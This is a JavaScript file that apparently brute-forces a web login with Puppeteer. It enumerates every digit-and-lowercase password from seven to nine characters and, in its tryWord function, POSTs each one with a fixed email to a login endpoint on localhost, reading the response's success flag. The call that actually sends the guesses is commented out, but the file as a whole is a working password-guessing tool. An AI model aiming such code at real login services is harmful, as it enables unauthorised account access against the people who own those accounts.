const puppeteer = require('puppeteer');
const EMAIL = 'test@gmail.com';

var plage = []

var browser = null;
var threads = 0;
var maxthreads = 1000;
var stop = false;
var word = "";

configurePlage(true, false, true);

(async () => {
    browser = await puppeteer.launch();

    try {
      const bonCode = await loop(7, 9);
     } catch(e) {
      console.log('Error happend while connecting to the URL: ', e.message)
     }

    await browser.close();
})();



async function loop(min =1, max =20){

	if(stop) return;
  if(word === "" && min > 0) word = plage[0].repeat(min)

	while(threads < maxthreads && word.length <= max){
		word = getNextWord(word);
    console.log(word)

		threads++;

    /*try {
      var result = await tryWord(word);
      console.log(word + ' : ' + result);
      if ( result ) return word
      loop();
    } catch(e) {
      console.log('Error happend while connecting to the URL: ', e.message)
    }*/

     threads--;
	}

}

function configurePlage(num = true, upper = true, lower = true){

  if(num) {
    for(i=48; i <= 57; i++) {
      plage.push(String.fromCharCode(i));
    }
  }
  if(upper) {
    for(i=65; i <= 90; i++) {
      plage.push(String.fromCharCode(i));
    }
  }
  if(lower) {
    for(i=97; i <= 122; i++) {
      plage.push(String.fromCharCode(i));
    }
  }

}

function getNextWord(word){

  for(i=word.length - 1; i >= 0; i--) {

    nextCharIndex = plage.indexOf(word.charAt(i)) + 1;
    if(nextCharIndex === plage.length) nextCharIndex = 0;
    word = word.replaceAt(i, plage[nextCharIndex]);

    if(nextCharIndex!=0) {
      return word;
    }

    if(i===0) return word + plage[0]

  }

  return word
}

async function tryWord(word){

  const page = await browser.newPage();
  await page.setRequestInterception(true);

  page.on('request', interceptedRequest => {
    var data = {
        'method': 'POST',
        'postData': `email=${EMAIL}&password=${word}`
    };
    
    interceptedRequest.continue(data);
  });

  const response = await page.goto('http://localhost:5000/api/auth/login');
  const responseBody = await response.text();
  await page.close();

  return JSON.parse(responseBody).success;
}

String.prototype.replaceAt = function(index, replacement) {
  return this.substring(0, index) + replacement + this.substring(index + replacement.length);
}